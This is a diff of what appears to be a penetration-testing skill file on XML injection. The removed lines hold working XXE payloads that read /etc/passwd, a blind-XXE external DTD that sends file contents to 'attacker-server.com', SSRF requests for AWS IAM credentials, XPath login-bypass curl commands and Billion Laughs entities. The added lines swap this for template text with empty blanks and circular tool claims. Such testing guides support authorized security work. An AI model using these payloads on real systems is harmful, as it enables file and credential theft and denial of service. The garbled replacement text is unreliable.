@@ -21,8 +21,7 @@ nist_csf:
 - PR.DS-10
 - DE.CM-01
 ---
-
-# Testing for XML Injection Vulnerabilities
+# Testing For Xml Injection Vulnerabilities
 
 ## When to Use
 - When testing applications that process XML input (SOAP APIs, XML-RPC, file uploads)
@@ -41,221 +40,24 @@ nist_csf:
 
 ## Workflow
 
-1. **Scope and authorize** — confirm written authorization and define target boundaries
-2. **Reconnaissance** — enumerate targets, services, and potential attack surfaces
-3. **Exploitation** — attempt exploitation of identified vulnerabilities within scope
-4. **Post-exploitation** — document access level, lateral movement, and data exposure
-5. **Report and remediate** — compile findings with reproduction steps and fix recommendations
-### Step 1 — Identify XML Processing Endpoints
-```bash
-# Look for endpoints accepting XML content types
-# Content-Type: application/xml, text/xml, application/soap+xml
-# Check WSDL files for SOAP services
-curl -s http://target.com/service?wsdl
+1. **Reconnaissance** — Gather information about the target related to . Identify attack surface.
+2. **Vulnerability Identification** — Enumerate potential  weaknesses using automated and manual techniques.
+3. **Exploit Development/Selection** — Use xml injection vulnerabilities to identify and test  vulnerabilities.
+4. **Execution** — Execute the  test in a controlled manner with proper authorization.
+5. **Post-Exploitation** — Document the impact and extent of successful exploitation.
+6. **Reporting** — Write detailed findings with reproduction steps, impact assessment, and remediation guidance.
 
-# Test if endpoint accepts XML by changing Content-Type
-curl -X POST http://target.com/api/data \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><root><test>hello</test></root>'
+## Tools
 
-# Check for XML file upload functionality
-# Look for .xml, .svg, .xlsx, .docx file processing
-```
-
-### Step 2 — Test for Basic XXE (File Retrieval)
-```xml
-<!-- Basic XXE to read local files -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root><data>&xxe;</data></root>
-
-<!-- Windows file retrieval -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
-]>
-<root><data>&xxe;</data></root>
-
-<!-- Using PHP wrapper for base64-encoded file content -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-]>
-<root><data>&xxe;</data></root>
-```
-
-### Step 3 — Test for Blind XXE with Out-of-Band Detection
-```xml
-<!-- Out-of-band XXE using external DTD -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
-  %xxe;
-]>
-<root><data>test</data></root>
-
-<!-- External DTD file (xxe.dtd hosted on attacker server) -->
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?data=%file;'>">
-%eval;
-%exfil;
-
-<!-- DNS-based out-of-band detection -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
-]>
-<root><data>&xxe;</data></root>
-```
-
-### Step 4 — Test for SSRF via XXE
-```xml
-<!-- Internal network scanning via XXE -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-<root><data>&xxe;</data></root>
-
-<!-- AWS metadata endpoint access -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-]>
-<root><data>&xxe;</data></root>
-
-<!-- Internal port scanning -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
-]>
-<root><data>&xxe;</data></root>
-```
-
-### Step 5 — Test for XPath Injection
-```bash
-# Basic XPath injection in search parameters
-curl "http://target.com/search?query=' or '1'='1"
-
-# XPath authentication bypass
-curl -X POST http://target.com/login \
-  -d "username=' or '1'='1&password=' or '1'='1"
-
-# XPath data extraction
-curl "http://target.com/search?query=' or 1=1 or ''='"
-
-# Blind XPath injection with boolean-based extraction
-curl "http://target.com/search?query=' or string-length(//user[1]/password)=8 or ''='"
-curl "http://target.com/search?query=' or substring(//user[1]/password,1,1)='a' or ''='"
-```
-
-### Step 6 — Test for XML Billion Laughs (DoS)
-```xml
-<!-- Billion Laughs attack (use only in authorized testing) -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
-]>
-<root><data>&lol4;</data></root>
-
-<!-- Quadratic blowup attack -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
-]>
-<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>
-```
-
-## Key Concepts
-
-| Concept | Description |
-|---------|-------------|
-| XXE (XML External Entity) | Attack exploiting XML parsers that process external entity references |
-| Blind XXE | XXE where response is not reflected; requires out-of-band channels |
-| XPath Injection | Injection into XPath queries used to navigate XML documents |
-| DTD (Document Type Definition) | Declarations that define XML document structure and entities |
-| Parameter Entities | Special entities (%) used within DTDs for blind XXE exploitation |
-| SSRF via XXE | Using XXE to make server-side requests to internal resources |
-| XML Bomb | Denial of service via recursive entity expansion (Billion Laughs) |
-
-## Tools & Systems
-
-| Tool | Purpose |
-|------|---------|
-| Burp Suite | HTTP proxy with XXE Scanner extension for automated detection |
-| XXEinjector | Automated XXE injection and data exfiltration tool |
-| OXML_XXE | Tool for embedding XXE payloads in Office XML documents |
-| xmllint | XML validation and parsing utility for payload testing |
-| interact.sh | Out-of-band interaction server for blind XXE detection |
-| Content Type Converter | Burp extension to convert JSON requests to XML for XXE testing |
-
-## Common Scenarios
-
-1. **File Disclosure** — Read sensitive server files (/etc/passwd, web.config) through classic XXE entity injection in XML input fields
-2. **SSRF to Cloud Metadata** — Access AWS/GCP/Azure metadata endpoints through XXE to steal IAM credentials and access tokens
-3. **Blind Data Exfiltration** — Extract sensitive data through out-of-band DNS/HTTP channels when XXE output is not reflected
-4. **SAML XXE** — Inject XXE payloads into SAML assertions during single sign-on authentication flows
-5. **SVG File Upload XXE** — Upload malicious SVG files containing XXE payloads to trigger server-side XML parsing
-
-## When NOT to Use
-
-- You need to perform real attacks, not test (use performing-* skills)
-- Task is about analyzing test results (use analyzing-* skills)
-- You need to implement test infrastructure (use implementing-* skills)
-- Task is about building test tools (use building-* skills)
-- You don't have test environment access
-- Task requires compliance validation (use auditing-* skills)
-
-
-## Red Flags
-
-- Performing actions without explicit written authorization from the asset owner
-- Testing against production systems without a defined scope and rules of engagement
-- Exceeding the authorized scope of the engagement
-- Leaving persistent access mechanisms without explicit approval
-- Causing denial-of-service on production systems during testing
+- **xml injection vulnerabilities** — Primary tool for this skill
+- **Vulnerability Scanner** — Automated weakness identification
+- **Exploitation Framework** — Controlled exploitation testing
+- **Reporting Tool** — Findings documentation and tracking
 
 ## Verification
 
-- All steps executed successfully against a test environment before production use
-- Output documented with screenshots or logs demonstrating expected behavior
-- All exploited vulnerabilities documented with reproduction steps
-- Scope boundaries confirmed — only authorized targets were tested
-- Remediation recommendations included for every finding
-
-## Output Format
-
-```
-## XML Injection Assessment Report
-- **Target**: http://target.com/api/xml-endpoint
-- **Vulnerability Types Found**: XXE, Blind XXE, XPath Injection
-- **Severity**: Critical
-
-### Findings
-| # | Type | Endpoint | Payload | Impact |
-|---|------|----------|---------|--------|
-| 1 | XXE File Read | POST /api/import | SYSTEM "file:///etc/passwd" | Local File Disclosure |
-| 2 | Blind XXE | POST /api/upload | External DTD with OOB | Data Exfiltration |
-| 3 | SSRF via XXE | POST /api/parse | SYSTEM "http://169.254.169.254/" | Cloud Credential Theft |
-
-### Remediation
-- Disable external entity processing in XML parser configuration
-- Use JSON instead of XML where possible
-- Implement XML schema validation with strict DTD restrictions
-- Block outbound connections from XML processing services
-```
-
-## Overview
-
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All  procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
